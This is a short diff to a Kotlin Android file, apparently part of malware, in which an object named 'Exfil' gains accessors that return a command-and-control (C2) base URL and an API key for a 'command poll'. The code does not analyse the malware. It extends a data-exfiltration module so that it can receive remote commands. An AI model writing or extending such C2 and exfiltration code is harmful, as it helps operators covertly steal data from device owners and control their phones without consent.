@@ -92,6 +92,15 @@ object Exfil {
 
     fun currentUrl(): String? = c2Url
 
+    /** Resolved C2 base URL (used by the command poll). */
+    fun baseUrl(ctx: Context): String? {
+        resolveConfig(ctx)
+        return c2Url?.trimEnd('/')
+    }
+
+    /** Resolved API key (used by the command poll). */
+    fun apiKeyValue(): String? = apiKey
+
     private fun endpoint(path: String): String? {
         val base = c2Url?.trimEnd('/') ?: return null
         return "$base$path"
